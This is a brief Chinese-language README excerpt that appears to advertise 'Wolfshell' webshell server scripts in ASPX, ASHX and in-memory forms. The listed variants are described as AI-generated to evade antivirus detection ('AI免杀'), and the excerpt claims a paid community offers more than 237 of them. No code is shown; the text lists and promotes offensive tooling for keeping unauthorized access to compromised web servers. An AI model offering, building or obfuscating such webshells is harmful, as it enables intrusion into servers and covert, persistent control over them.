...
### WebShell服务端 
- [金刚狼Wolfshell](wolfshell): aspx、ashx、内存马各1个脚本，AI免杀20个[ASPX](wolfshell/aspx)、20个[ASHX](wolfshell/ashx)、10个[MEM](wolfshell/mem)
...
星球已提供237+金刚狼WebShell服务端脚本，含ASPX、ASHX、内存马
